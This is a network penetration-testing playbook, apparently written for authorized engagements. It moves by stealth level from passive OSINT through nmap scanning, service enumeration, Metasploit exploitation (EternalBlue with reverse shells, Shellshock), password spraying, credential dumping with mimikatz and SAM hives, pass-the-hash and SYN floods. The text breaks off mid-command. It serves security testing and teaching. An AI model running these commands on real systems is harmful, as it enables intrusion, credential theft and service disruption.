# Network VAPT

This is how the attack chain goes for us:

`Networks` >>> `Hosts` >>>>> `Open Ports` >>>>> `Services` >>>>> `Service Versions` >>>>>>>>>>>>> `Vulnerabilities` > `Exploits`

We are looking for mainly 2 things:
1. Does the system run any vulnerable version of a service, which we can exploit?
2. Does the system run any misconfigured service, which we can exploit?

The first part covers all the vulnerabilities which could apper in the codebases of the service itself, and the second part covers the vulnerabilities which could appear in the config files. The first part is well-documented, published and tracked. The second part is most often not.

##### Challenges

1. Network VAPT is a numbers game. 1 network can have 100 hosts, each can have 10-30 services running, varying versions, multiple vulnerabilities and a lot of exploit PoCs but barely a handful of working exploits. Tracking, documenting, assessing and managing all these is the problem.

2. **The Defenders**: The firewalls, EDRs, IDS, IPS, network monitoring, SIEM tools, SOCs, NOCs and what not. Attacking enterprise networks are not fun. We literally have to be a network ninja and a ghost at the same time.

3. The Changing Network: It is totally a real prossibility that the network services may go down and new services may come up as you do your testing. Deal with it! 

We don't know if there is any firewalls, IDS or IPS sitting on the other side waiting for our nmap scans to show up. So it's important that we start sneaky and then progressively get louder and noisy as we gather information. So, the quieter tools first and then the big automated tools (like Nessus, OpenVAS, Nikto, Nuclei).

> **⚠️ Legal Notice:** This playbook is strictly for authorized engagements only. Ensure written scope and Rules of Engagement (RoE) are signed before executing any phase. Unauthorized use is illegal.

---

#### Pre-engagement Prepping
Before we start we need to get to know ourselves a bit first.

- [ ] Document your own egress IP — know what the target sees.
```
curl -s https://ifconfig.me
curl -s https://api.ipify.org
```

- [ ] Sync time for accurate log correlation
```
sudo ntpdate pool.ntp.org         # Linux
w32tm /resync                     # Windows
```

- [ ] Prepare output directory structure
```
mkdir -p ~/vapt/{recon,scan,exploit,loot,report}
```

---

# db:0 — Dead Silence / Pure OSINT
> **Philosophy:** You generate zero packets to the target. Everything is gathered from public sources. The client cannot detect this phase at all. You are a ghost.

## Objective
Build the target's external footprint using only publicly available data. No direct contact with any client-owned IP, domain, or system.

---

### 0.1 — WHOIS & Domain Registration Intel

**Packets sent:** `0` | **Packet type:** None | **Detectable:** Never

```bash
# Linux
whois targetcorp.com
whois 203.0.113.0/24              # If you know their IP range

# Windows
whois.exe targetcorp.com          # Sysinternals whois
nslookup targetcorp.com           # Basic DNS from your local resolver
```

**What you learn:** Registrar, registration date, expiry, registrant name/org/email (if not privacy-protected), name servers, abuse contacts.

---

### 0.2 — Passive DNS & Certificate Transparency

**Packets sent:** `0` (queries go to third-party services, not client) | **Detectable:** Never

```bash
# crt.sh — Certificate Transparency logs (massive subdomain goldmine)
curl -s "https://crt.sh/?q=%25.targetcorp.com&output=json" | \
  jq -r '.[].name_value' | sort -u

# dnsx passive mode — resolve from public resolvers only
cat subdomains.txt | dnsx -silent -a -resp

# Amass passive-only mode (no direct enumeration)
amass enum --passive -d targetcorp.com -o amass_passive.txt

# theHarvester — emails, names, subdomains from search engines
theHarvester -d targetcorp.com -b google,bing,linkedin,shodan -l 500

# Windows alternative
# Use browser manually: site:targetcorp.com inurl: filetype:
```

**What you learn:** All subdomains from SSL certificates issued over years, associated IPs, internal naming conventions leaked via cert SANs.

---

### 0.3 — Shodan / Censys / FOFA (Passive Banner Grabbing)

**Packets sent:** `0` | **Packet type:** None | **Detectable:** Never

```bash
# Shodan CLI
shodan search "org:\"Target Corp\""
shodan search "ssl.cert.subject.cn:targetcorp.com"
shodan search "hostname:targetcorp.com" --fields ip_str,port,banner

shodan host 203.0.113.45          # Full host report on a known IP

# Censys (web or CLI)
censys search "targetcorp.com" --index-type hosts

# BGP / ASN lookup — find all their IP ranges
curl -s https://api.bgpview.io/search?query_term=Target+Corp | jq .
curl -s https://api.bgpview.io/asn/AS12345/prefixes | jq .
```

**What you learn:** Open ports, banners, software versions, SSL certs, geolocation — all without touching client systems. Shodan already did the scanning for you.

---

### 0.4 — Google Dorks & Search Engine Recon

**Packets sent:** `0` | **Detectable:** Never

```
site:targetcorp.com filetype:pdf
site:targetcorp.com filetype:xlsx OR filetype:docx
site:targetcorp.com inurl:admin OR inurl:login OR inurl:portal
site:targetcorp.com intext:"internal use only"
site:targetcorp.com ext:conf OR ext:env OR ext:bak
"@targetcorp.com" filetype:xls
"targetcorp.com" inurl:vpn OR inurl:citrix OR inurl:webmail
intitle:"index of" site:targetcorp.com
```

**What you learn:** Exposed files, credentials in documents, internal portals indexed publicly, staff email patterns.

---

### 0.5 — Social & Organizational OSINT

**Packets sent:** `0` | **Detectable:** Never

```bash
# LinkedIn recon (manual or tools like linkedin2username)
python3 linkedin2username.py -u your@email.com -c "Target Corp"
# Outputs username wordlists in common formats: jsmith, john.smith, j.smith

# Breach database checks (for context, not exploitation without scope)
# haveibeenpwned API, Dehashed, IntelX

# GitHub / GitLab — leaked secrets
github-search -q "targetcorp.com" --type code
trufflehog github --org=targetcorp                # Secret scanning

# Wayback Machine — old pages, old endpoints
curl "http://web.archive.org/cdx/search/cdx?url=*.targetcorp.com/*&output=json&fl=original&collapse=urlkey" \
  | jq -r '.[] | .[0]' | sort -u
```

**What you learn:** Employee names → username wordlists, password spray candidates, leaked API keys/creds in code repos, forgotten endpoints.

---

---

# db:1 — Whisper / Indirect Probing
> **Philosophy:** You begin sending a tiny number of packets but not to the client directly — or using highly spoofable, ultra-low-rate methods. Think: 1–5 packets total. A SOC would never notice this in logs.

## Objective
Validate OSINT findings with minimal direct contact. Confirm IPs are live using single-packet techniques.

---

### 1.1 — Single ICMP Echo (Ping — 1 Packet)

**Packets sent:** `1` | **Packet type:** ICMP Echo Request (safe, standard) | **Detectable:** Low (only if ICMP is logged)

```bash
# Linux — send exactly 1 ICMP packet, no repeat
ping -c 1 203.0.113.45

# Windows — send exactly 1 ICMP packet
ping -n 1 203.0.113.45

# With a very long timeout (don't retry, be patient)
ping -c 1 -W 5 203.0.113.45
```

**What you learn:** Is the host alive? Round-trip time. TTL value hints at OS (Linux ~64, Windows ~128, Cisco ~255).

---

### 1.2 — Single DNS Query (1 Packet)

**Packets sent:** `1–2` (query + response) | **Packet type:** UDP/53 DNS query (safe, standard) | **Detectable:** Only on DNS logging — completely normal traffic

```bash
# Linux
dig targetcorp.com A
dig targetcorp.com MX          # Mail servers — attack surface
dig targetcorp.com NS          # Name servers
dig targetcorp.com TXT         # SPF, DMARC, verification tokens

# Query specific resolver (avoid using client's DNS server at db:1)
dig @8.8.8.8 targetcorp.com A

# Windows
nslookup targetcorp.com
nslookup -type=MX targetcorp.com
nslookup -type=TXT targetcorp.com
```

**What you learn:** IP addresses, mail exchanger hosts (often less protected), TXT records may leak internal tools (MS365 tenant ID, Atlassian, Okta, etc.).

---

### 1.3 — Traceroute (Low-TTL Probes)

**Packets sent:** `~30–90` (3 packets × number of hops) | **Packet type:** UDP or ICMP TTL-exceeded probes | **Detectable:** Low — looks like normal routing behavior

```bash
# Linux — ICMP-based (stealthier than UDP)
traceroute -I -q 1 203.0.113.45    # -I = ICMP, -q 1 = 1 probe per hop

# Linux — TCP-based (may bypass some filters)
traceroute -T -p 443 203.0.113.45  # TCP SYN to port 443

# Windows
tracert 203.0.113.45
pathping 203.0.113.45              # Combines tracert + latency stats

# hping3 — TCP traceroute (disguised as HTTPS traffic)
hping3 -S --traceroute -p 443 203.0.113.45
```

**What you learn:** Network topology, number of hops, load balancers, WAF/proxy presence, ISP vs on-prem hosting, firewall positions.

---

---

# db:2 — Featherweight / Surgical Single-Port Checks
> **Philosophy:** You are testing specific, individual ports on specific hosts. No sweeping. ~10–50 packets per host. A well-tuned IDS might catch repeated use but a single check won't fire alerts.

## Objective
Validate specific services discovered via OSINT (e.g., confirm port 443 is actually open, check if SSH is exposed).

---

### 2.1 — Nmap Single-Port, Single-Host (Stealth SYN)

**Packets sent:** `~2–4` per port | **Packet type:** TCP SYN (half-open — never completes handshake) | **Detectable:** Unlikely — looks like a failed connection attempt

```bash
# Linux — stealth SYN scan on ONE specific port
sudo nmap -sS -p 443 -Pn --disable-arp-ping 203.0.113.45

# With timing set to paranoid (slowest possible)
sudo nmap -sS -p 443 -T0 -Pn 203.0.113.45

# Windows (nmap for Windows or npcap required)
nmap -sT -p 443 -Pn 203.0.113.45  # TCP connect (no raw sockets on Windows)

# Flags explained:
# -sS  = SYN scan (half-open, doesn't complete 3-way handshake)
# -Pn  = Skip host discovery (don't ping first)
# -T0  = Paranoid timing (1 packet per 5 minutes, IDS evasion)
# --disable-arp-ping = Don't send ARP requests
```

**What you learn:** Is this specific port open/closed/filtered?

---

### 2.2 — Netcat / Ncat — Manual Banner Grab (1 Connection)

**Packets sent:** `~6–10` (full TCP handshake + HTTP GET + response) | **Packet type:** Normal TCP (safe, completes handshake) | **Detectable:** Looks like a normal client connection

```bash
# Linux — grab HTTP banner
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc -w 3 203.0.113.45 80

# Grab HTTPS banner (via openssl)
echo | openssl s_client -connect 203.0.113.45:443 -servername targetcorp.com 2>/dev/null \
  | openssl x509 -noout -text

# Grab SSH banner (just connect, read, disconnect)
nc -w 2 203.0.113.45 22

# Grab SMTP banner
nc -w 3 203.0.113.45 25

# Windows
# Telnet (if enabled)
telnet 203.0.113.45 80
# Or PowerShell
$tcp = New-Object System.Net.Sockets.TcpClient
$tcp.Connect("203.0.113.45", 80); $stream = $tcp.GetStream()
$bytes = [System.Text.Encoding]::ASCII.GetBytes("HEAD / HTTP/1.0`r`n`r`n")
$stream.Write($bytes, 0, $bytes.Length)
Start-Sleep -Milliseconds 500
$buffer = New-Object byte[] 1024
$read = $stream.Read($buffer, 0, 1024)
[System.Text.Encoding]::ASCII.GetString($buffer, 0, $read)
```

**What you learn:** Exact software version from banners (Apache 2.4.41, OpenSSH 7.4, IIS 10.0), SSL cert details, certificate SANs.

---

---

# db:3 — Low Crawl / Slow Targeted Scan
> **Philosophy:** You're now scanning a small set of ports across a small set of IPs, but with maximum timing delays. Think T1 or T2 timing. ~100–500 packets total. A basic IDS won't correlate these as a scan.

## Objective
Map the top services on confirmed live hosts without triggering threshold-based IDS rules.

---

### 3.1 — Nmap Top-20 Ports, Paranoid/Sneaky Timing

**Packets sent:** `~40–120` per host | **Packet type:** TCP SYN (half-open) | **Detectable:** Unlikely at T1/T2 — well below most IDS thresholds

```bash
# Linux — top 20 ports, sneaky timing, decoy packets
sudo nmap -sS --top-ports 20 -T1 -Pn --data-length 15 203.0.113.45

# Add a decoy to confuse IDS (mix your IP with fake ones)
sudo nmap -sS --top-ports 20 -T1 -Pn -D 10.0.0.1,10.0.0.2,ME 203.0.113.45

# Fragment packets to evade signature-based IDS
sudo nmap -sS --top-ports 20 -T1 -Pn -f 203.0.113.45

# Timing flags:
# T0 = Paranoid  (5 min between probes)
# T1 = Sneaky    (15 sec between probes)
# T2 = Polite    (0.4 sec between probes)
# T3 = Normal    (default)
# T4 = Aggressive
# T5 = Insane
```

---

### 3.2 — Version Detection on Known-Open Ports Only

**Packets sent:** `~50–200` per port | **Packet type:** Mixed TCP — safe protocol probes | **Detectable:** Low if limited to confirmed open ports

```bash
# Version detection ONLY on ports we KNOW are open (from prior steps)
sudo nmap -sV --version-intensity 0 -p 22,80,443 -Pn -T2 203.0.113.45

# --version-intensity 0 = Lightest probing (just read banner, no active probes)
# --version-intensity 9 = Most aggressive (sends many protocol-specific probes)

# OS fingerprint (passive-ish — only if host already responded)
sudo nmap -O --osscan-limit -p 22,80,443 -Pn -T2 203.0.113.45
# --osscan-limit = Only attempt OS detection if confident conditions are met
```

---

### 3.3 — DNS Zone Transfer Attempt (1 Packet — Catastrophic if Misconfigured)

**Packets sent:** `2–4` | **Packet type:** TCP/53 DNS AXFR request (legitimate protocol, safe packet) | **Detectable:** Yes — zone transfers are logged

```bash
# Linux
dig axfr @ns1.targetcorp.com targetcorp.com
dig axfr @ns2.targetcorp.com targetcorp.com

# Windows
nslookup
  server ns1.targetcorp.com
  set type=any
  ls -d targetcorp.com

# If successful: you get every hostname, IP, and record in their DNS — jackpot
# Most are blocked, but misconfigured servers still exist
```

---

---

# db:4 — Calculated / Selective Multi-Host
> **Philosophy:** You now scan a /24 or /28 subnet but on very few ports, with deliberate delays. ~1,000–5,000 packets. Slow enough to blend into background noise. A skilled analyst reviewing 24h of logs might notice something unusual.

## Objective
Identify all live hosts in a subnet and their primary listening services.

---

### 4.1 — Nmap Host Discovery (Ping Sweep) on a Subnet

**Packets sent:** `~4 × number of hosts` (ICMP + ARP + TCP) | **Packet type:** ARP (local), ICMP, TCP SYN to ports 80/443 | **Detectable:** Medium — ping sweeps across subnets are logged by many SIEM

```bash
# Linux — combined host discovery (ICMP + TCP SYN 80/443 + TCP ACK 443)
sudo nmap -sn -PE -PS80,443 -PA443 -T2 203.0.113.0/24 -oG hosts_alive.gnmap

# Parse alive hosts
grep "Up" hosts_alive.gnmap | awk '{print $2}' > alive_hosts.txt

# Windows (fping or nmap for Windows)
nmap -sn 203.0.113.0/24
# Batch ping sweep (PowerShell)
1..254 | ForEach-Object { 
  $ip = "203.0.113.$_"
  if (Test-Connection -ComputerName $ip -Count 1 -Quiet) { $ip }
}
```

---

### 4.2 — Nmap Scan of Alive Hosts — Top 100 Ports

**Packets sent:** `~400–600 per host` | **Packet type:** TCP SYN half-open | **Detectable:** Medium — if IDS watches per-source port scan rates

```bash
# Linux — read alive hosts from file, scan top 100 ports
sudo nmap -sS --top-ports 100 -iL alive_hosts.txt -T2 -Pn \
  --randomize-hosts --data-length 10 \
  -oA scan_top100

# --randomize-hosts = Don't scan in sequential order (evades sequential detection)
# --data-length 10  = Pad packets with 10 bytes of random data (break signatures)

# Windows
nmap -sT --top-ports 100 -iL alive_hosts.txt -Pn -T2
```

---

### 4.3 — UDP Service Discovery (Key Ports)

**Packets sent:** `~3–5 per port per host` | **Packet type:** UDP datagrams — crafted per-protocol where possible | **Detectable:** Low (UDP scans are noisier to log but less monitored)

**WARN**: UDP Scans can be really really slow. So, it's important to pick your targets well.

```bash
# UDP scan key services: DNS(53), SNMP(161/162), TFTP(69), NTP(123), RPC(111)
sudo nmap -sU -p 53,69,111,123,161,162,500,514,1900 -iL alive_hosts.txt \
  -T2 -Pn --version-intensity 0 -oA scan_udp_key

sudo nmap -sU --top-ports 20 -iL <IP_list> -oA Initial_TCP_Scan -v

# SNMP community string brute (if 161 is open) — can leak massive amount of info
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt -i alive_hosts.txt
snmpwalk -v2c -c public 203.0.113.45 1.3.6.1.2.1.1   # System info
snmpwalk -v2c -c public 203.0.113.45 1.3.6.1.2.1.25  # Running processes
```

---

---

# db:5 — Moderate / Standard Pentest Pace
> **Philosophy:** This is the "normal" penetration test pace. You're scanning confirmed hosts with a comprehensive port list, running version detection and basic scripts. ~10,000–50,000 packets per target. A well-tuned IDS will likely fire. SOC may begin investigating.

## Objective
Full service enumeration of confirmed targets — build complete service map.

---

### 5.1 — Nmap Full Port Scan (All 65535 TCP Ports)

**Packets sent:** `~65,535–131,070` per host | **Packet type:** TCP SYN half-open | **Detectable:** Yes — will trigger port scan alerts in most IDS

```bash
# Linux — full TCP port scan with version detection
sudo nmap -sS -sV -p- -T3 -Pn --open 203.0.113.45 \
  -oA full_tcp_203.0.113.45

# Split for speed: scan ranges in parallel
sudo nmap -sS -p 1-20000 -T3 -Pn 203.0.113.45 &
sudo nmap -sS -p 20001-40000 -T3 -Pn 203.0.113.45 &
sudo nmap -sS -p 40001-65535 -T3 -Pn 203.0.113.45 &

# Windows
nmap -sT -p- -T3 -Pn 203.0.113.45
```

---

### 5.2 — Nmap Default Script Scan (NSE)

**Packets sent:** `~5,000–30,000` depending on open ports | **Packet type:** Protocol-specific (safe probes) | **Detectable:** Yes — NSE scripts trigger application-layer activity

```bash
# Safe scripts only (won't exploit, only enumerate)
sudo nmap -sC -sV -p 22,80,443,3389,8080 -Pn 203.0.113.45 -oA nmap_scripts

# Specific script categories
sudo nmap --script=banner,http-title,http-server-header,ssl-cert \
  -p 80,443,8080,8443 -Pn 203.0.113.45

# SMB enumeration scripts (very revealing if 445 is open)
sudo nmap --script=smb-os-discovery,smb-enum-shares,smb2-security-mode \
  -p 445 -Pn 203.0.113.45

# Vulnerability scripts (now crossing into active detection)
sudo nmap --script=vuln -p 80,443,445,22 -Pn 203.0.113.45
```

---

### 5.3 — Web Application Recon (HTTP)

**Packets sent:** `~500–2,000` | **Packet type:** Normal HTTP GET/HEAD requests | **Detectable:** Yes — WAF/IDS will log user-agent and request patterns

```bash
# HTTP methods enumeration
curl -sI https://targetcorp.com
curl -s -X OPTIONS https://targetcorp.com -v 2>&1 | grep "Allow:"

# WhatWeb — technology fingerprinting
whatweb -a 1 https://targetcorp.com    # Stealthy
whatweb -a 3 https://targetcorp.com    # Aggressive

# Nikto — web server scanner (loud but comprehensive)
nikto -h https://targetcorp.com -C all -Tuning 123bde -output nikto.txt

# Robots.txt & sitemap (normal browser behavior)
curl -s https://targetcorp.com/robots.txt
curl -s https://targetcorp.com/sitemap.xml
```

---

---

# db:6 — Active / Service-Specific Deep Enum
> **Philosophy:** Protocol-specific deep enumeration. You're now actively talking to services in detail. ~50,000–200,000 packets. SOC is probably alert. IR team may be spinning up.

## Objective
Extract maximum information from each identified service before moving to exploitation.

---

### 6.1 — SMB / Windows Enumeration

**Packets sent:** `~200–2,000` | **Packet type:** SMB protocol (authenticated/null session) | **Detectable:** Yes — domain controllers log this heavily

```bash
# Null session enumeration
enum4linux -a 203.0.113.45 | tee enum4linux_output.txt
enum4linux-ng -A 203.0.113.45 -oY enum4linux_ng.yaml

# smbclient — list shares
smbclient -L \\\\203.0.113.45 -N              # Null session
smbclient -L \\\\203.0.113.45 -U "guest%"

# CrackMapExec — SMB fingerprint
crackmapexec smb 203.0.113.0/24               # Map entire subnet
crackmapexec smb 203.0.113.45 --shares        # Enumerate shares
crackmapexec smb 203.0.113.45 --users         # Enumerate users (if allowed)
crackmapexec smb 203.0.113.45 --pass-pol      # Password policy

# Windows
net view \\203.0.113.45 /all
net use \\203.0.113.45\IPC$ "" /user:""       # Null session
```

---

### 6.2 — Directory & File Brute Forcing (Web)

**Packets sent:** `~5,000–50,000` | **Packet type:** HTTP GET (normal but high-volume) | **Detectable:** Yes — WAF will almost certainly fire

```bash
# Gobuster — directory enumeration
gobuster dir -u https://targetcorp.com \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,asp,aspx,jsp,html,txt,bak,old \
  -t 20 -o gobuster_output.txt

# ffuf — faster, with rate limiting for stealth
ffuf -u https://targetcorp.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -rate 50 -o ffuf_output.json -of json

# Feroxbuster — recursive directory brute
feroxbuster --url https://targetcorp.com --depth 3 \
  --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt \
  --rate-limit 50

# Windows (curl-based loop)
$wordlist = Get-Content "C:\tools\wordlist.txt"
foreach ($dir in $wordlist) {
  $r = Invoke-WebRequest -Uri "https://targetcorp.com/$dir" -ErrorAction SilentlyContinue
  if ($r.StatusCode -ne 404) { Write-Host "$dir -> $($r.StatusCode)" }
}
```

---

### 6.3 — SSL/TLS Configuration Audit

**Packets sent:** `~500–2,000` | **Packet type:** TLS handshake probes | **Detectable:** Moderate — looks like aggressive scanning

```bash
# testssl.sh — comprehensive TLS testing
./testssl.sh --parallel --fast https://targetcorp.com

# sslyze — Python-based TLS scanner
sslyze 203.0.113.45:443 --regular

# nmap TLS scripts
sudo nmap --script=ssl-enum-ciphers,ssl-dh-params,ssl-heartbleed \
  -p 443 203.0.113.45

# OpenSSL manual cipher probe
openssl s_client -connect 203.0.113.45:443 -ssl3 2>&1   # SSLv3 (POODLE)
openssl s_client -connect 203.0.113.45:443 -tls1 2>&1   # TLSv1.0
```

---

---

# db:7 — Loud / Credential & Vulnerability Scanning
> **Philosophy:** You're now running automated vulnerability scanners and attempting credential authentication. Very loud. SOC is awake. IDS/IPS is likely blocking your IP or throttling connections.

## Objective
Identify exploitable vulnerabilities and weak credentials across the attack surface.

---

### 7.1 — Nuclei — Template-Based Vulnerability Scanning

**Packets sent:** `~10,000–100,000` depending on template count | **Packet type:** HTTP/HTTPS (protocol-compliant but probing for vulns) | **Detectable:** Absolutely — will trigger WAF and IDS

```bash
# Run critical + high severity templates only
nuclei -u https://targetcorp.com -severity critical,high -o nuclei_output.txt

# Full scan with all templates
nuclei -u https://targetcorp.com -t ~/nuclei-templates/ \
  -rate-limit 50 -o nuclei_full.txt

# Scan multiple targets
nuclei -l alive_hosts.txt -t ~/nuclei-templates/ \
  -severity critical,high,medium -o nuclei_multi.txt

# Specific categories
nuclei -u https://targetcorp.com -tags cve,panel,exposure,misconfig
```

---

### 7.2 — Password Spraying (Low & Slow)

**Packets sent:** `~1 per user per attempt` | **Packet type:** Authentication protocol (SSH, SMB, HTTP) | **Detectable:** Yes — failed auth always logged; spray is detectable via lockout monitoring

```bash
# IMPORTANT: Know the lockout policy before spraying. Default Windows = 5 attempts.
# Rule: 1 password per 30 minutes to avoid lockouts

# SSH spray (1 password across all users)
hydra -L users.txt -p "Winter2024!" 203.0.113.45 ssh \
  -t 1 -W 30 -f                # -t 1 thread, -W 30s wait, -f stop on success

# HTTP form spray
hydra -L users.txt -p "Winter2024!" 203.0.113.45 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 1 -W 30

# SMB spray with CrackMapExec
crackmapexec smb 203.0.113.45 -u users.txt -p "Winter2024!" \
  --continue-on-success --no-bruteforce

# Windows — LDAP authentication spray
# Use Spray or Ruler tools against Office365/Exchange
```

---

### 7.3 — Common Vulnerability Exploitation Checks

**Packets sent:** `~50–500 per check` | **Packet type:** Protocol-specific exploit probes | **Detectable:** Yes — most CVE scanners are signature-matched by IDS

```bash
# EternalBlue check (MS17-010) — DO NOT exploit without explicit scope
sudo nmap --script smb-vuln-ms17-010 -p 445 203.0.113.45

# BlueKeep (CVE-2019-0708) — RDP
sudo nmap --script rdp-vuln-ms12-020 -p 3389 203.0.113.45

# Log4Shell (CVE-2021-44228) — via Nuclei template
nuclei -u https://targetcorp.com -t cves/2021/CVE-2021-44228.yaml

# Heartbleed — OpenSSL
sudo nmap --script ssl-heartbleed -p 443 203.0.113.45
python3 heartbleed.py 203.0.113.45 443    # PoC check only

# POODLE — SSL3
sudo nmap --script ssl-poodle -p 443 203.0.113.45

# ShellShock (CGI endpoints)
curl -H "User-Agent: () { :; }; echo; echo 'VULNERABLE'" \
  https://targetcorp.com/cgi-bin/test.cgi
```

---

---

# db:8 — Aggressive / Broad Exploitation Attempt
> **Philosophy:** Metasploit is running. You're actively attempting exploitation of confirmed vulnerabilities. Every security appliance in the environment is generating alerts. IR team is responding. Network defenders are actively looking for your source IP.

## Objective
Gain initial foothold on one or more systems.

---

### 8.1 — Masscan — Full Internet-Speed Port Scan

**Packets sent:** `65,535 × number of IPs` in seconds | **Packet type:** TCP SYN (raw packets, NOT completing handshake) | **Detectable:** Absolutely — one of the loudest possible scans

```bash
# Scan entire /24 all 65535 ports at 10,000 pps
sudo masscan 203.0.113.0/24 -p 0-65535 \
  --rate 10000 \
  --output-format grepable \
  --output-filename masscan_results.gnmap

# Feed masscan results into nmap for service detection
sudo nmap -sV -sC -Pn -iL masscan_open_ports.txt \
  -oA nmap_from_masscan

# Rate guide:
# --rate 100     = Very slow (stealthy)
# --rate 10000   = Moderate
# --rate 100000  = Fast (may cause packet loss on your NIC)
# --rate 1000000 = Maximum (will crash most networks)
```

---

### 8.2 — Metasploit — Automated Exploitation

**Packets sent:** Varies `(~100 to 10,000+)` per exploit module | **Packet type:** Maliciously crafted — designed to trigger vulnerabilities | **Detectable:** Yes — Metasploit signatures are in every IDS

```bash
# Start Metasploit
msfconsole -q

# EternalBlue (SMBv1 RCE) — Windows 7/Server 2008
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 203.0.113.45
set LHOST <your_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LPORT 4444
run

# BlueKeep (RDP RCE) — Windows 7/Server 2008
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 203.0.113.45
run

# Shellshock (Bash RCE via HTTP)
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 203.0.113.45
set TARGETURI /cgi-bin/vulnerable.cgi
run

# Web delivery — stage a payload via HTTP
use exploit/multi/script/web_delivery
set TARGET 7        # Windows PowerShell
set PAYLOAD windows/x64/meterpreter/reverse_http
set LHOST <your_IP>
run
# Copy and paste the generated command on victim via other access
```

---

### 8.3 — hping3 — Custom Packet Crafting

**Packets sent:** User-defined (can be unlimited) | **Packet type:** Configurable — SYN, FIN, RST, XMAS, fragmented, malformed | **Detectable:** Yes — malformed packets are IDS signatures

```bash
# TCP SYN flood to test rate limiting / DDoS resilience (DoS test — only with scope)
sudo hping3 -S --flood -V -p 80 203.0.113.45

# XMAS scan (FIN+PSH+URG flags — elicits RST from closed ports)
sudo hping3 -F -P -U -p 445 203.0.113.45

# NULL scan (no flags — RFC-compliant behavior: closed ports send RST)
sudo hping3 -p 445 203.0.113.45

# ACK scan (firewall mapping — ACK bypasses stateless ACLs)
sudo hping3 -A -p 80 --count 5 203.0.113.45

# Spoof source IP (used in decoy/amplification testing — requires scope)
sudo hping3 -S -p 80 --spoof 10.0.0.1 203.0.113.45

# Port scan with custom interval (1 packet per second)
sudo hping3 -S -p ++1 --count 1024 --interval u100000 203.0.113.45
# --interval u100000 = 100ms between packets
```

---

---

# db:9 — Full Aggression / Post-Exploitation
> **Philosophy:** You have a foothold. Now you're doing internal reconnaissance, lateral movement, and privilege escalation. You own one system and you're pivoting. Network defenders are in full incident response. They may be pulling cables.

## Objective
Escalate privileges, move laterally, and identify critical assets / crown jewels.

---

### 9.1 — Internal Network Discovery (From Foothold)

**Packets sent:** `~10,000–500,000` | **Packet type:** ARP, ICMP, TCP SYN (all now from inside the network) | **Detectable:** Yes — but now you look like an internal infected host

```bash
# From Meterpreter shell — ARP table (0 packets)
arp -a
run post/multi/gather/arp_scanner RHOSTS=10.0.0.0/24

# From Meterpreter — route and pivot
run post/multi/manage/autoroute SUBNET=10.0.0.0 NETMASK=255.255.255.0
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
set PORTS 22,80,443,445,3389,1433,3306
run

# From bash shell — internal ping sweep
for i in $(seq 1 254); do
  ping -c 1 -W 1 10.0.0.$i &>/dev/null && echo "10.0.0.$i is alive"
done

# From PowerShell (Windows foothold)
1..254 | ForEach-Object {
  $ip = "10.0.0.$_"
  if (Test-Connection $ip -Count 1 -Quiet -TimeoutSeconds 1) {
    Write-Host "[+] $ip ALIVE"
  }
}
```

---

### 9.2 — Credential Dumping (Windows)

**Packets sent:** `~0 (local)` | **Packet type:** N/A — local OS calls | **Detectable:** Yes — EDR/AV will alert on LSASS access, mimikatz signatures

```bash
# Mimikatz — from Meterpreter (memory-based, no file drop)
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets

# ProcDump — dump LSASS (then parse offline)
# procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Reg SAM dump (built-in Windows tools — LOL bins, less detectable)
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive
# Transfer and parse with: impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# Linux — /etc/shadow
cat /etc/shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

### 9.3 — Pass-the-Hash / Lateral Movement

**Packets sent:** `~100–500 per target` | **Packet type:** SMB/WinRM/RDP authentication (crafted NTLM) | **Detectable:** Yes — NTLM PtH is flagged by Windows Event 4624 (Logon Type 3)

```bash
# CrackMapExec — PtH across subnet
crackmapexec smb 10.0.0.0/24 \
  -u Administrator \
  -H aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 \
  --local-auth

# impacket — PsExec with hash
impacket-psexec Administrator@10.0.0.10 \
  -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4

# impacket — WMIexec (less noisy than PsExec — doesn't create service)
impacket-wmiexec Administrator@10.0.0.10 \
  -hashes :32ed87bdb5fdc5e9cba88547376818d4

# Evil-WinRM — WinRM lateral movement (port 5985)
evil-winrm -i 10.0.0.10 -u Administrator \
  -H 32ed87bdb5fdc5e9cba88547376818d4
```

---

---

# db:10 — Maximum Noise / Simulated Full Breach
> **Philosophy:** This is a declared war simulation. You're running full-speed tools with no regard for detection. Every tool, every technique, simultaneously. You WANT to be detected to test the SOC's response time and capability. This is "assumed breach" / purple team territory.

## Objective
Test the SOC/NOC/IR team's detection and response capability. Generate maximum signal.

---

### 10.1 — Masscan at Maximum Rate (Stress Test)

**Packets sent:** `Millions — millions per second at max` | **Packet type:** Raw TCP SYN (spoofable, malformed at max speed) | **Detectable:** Instantly

```bash
# Maximum rate scan — will saturate NIC and potentially disrupt target
# ⚠️ Only on dedicated test ranges — WILL cause service disruption
sudo masscan 203.0.113.0/24 -p 0-65535 --rate 1000000 -oG masscan_max.gnmap

# Combined with nmap for service detection simultaneously
sudo masscan 203.0.113.0/24 -p 0-65535 --rate 500000 \
  | awk '/open/ {print $6, $4}' \
  | while read ip port; do
      nmap -sV -p ${port%%/*} $ip --open &
    done
```

---

### 10.2 — Nmap Insane Mode — Full Enum in Minutes

**Packets sent:** `Hundreds of thousands` | **Packet type:** TCP SYN + UDP + NSE scripts simultaneously | **Detectable:** Immediately — will saturate IDS logs

```bash
# All TCP + UDP + Scripts + Version + OS at T5 (insane timing)
sudo nmap -sS -sU -sV -sC -O -p- -T5 -Pn --open \
  --script=vuln,exploit,auth,brute,discovery \
